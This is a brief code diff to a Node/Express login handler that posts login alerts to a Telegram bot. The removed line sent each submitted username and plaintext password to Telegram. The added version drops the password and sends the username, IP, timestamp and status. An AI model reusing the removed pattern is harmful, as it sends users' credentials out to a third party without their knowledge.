@@ -19,8 +19,13 @@ app.post("/login", async (req, res) => {
 
 
     
-    const message = `🚨 Login Attempt 🚨\nUsername: ${username}\nPassword: ${password}\nIP: ${ip} \n#LoginAttempt #ReddotSecurity`;
-    
+    const message = `🚨 !!!تم اكتشاف تسجيل دخول جديد 🚨
+Username: ${username}
+IP Address: ${ip}
+Timestamp: ${new Date().toISOString()}
+Status: ${status} 
+
+#LoginAttempt #SecurityAlert`;
     await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         params: { chat_id: TELEGRAM_CHAT_ID, text: message }
     });
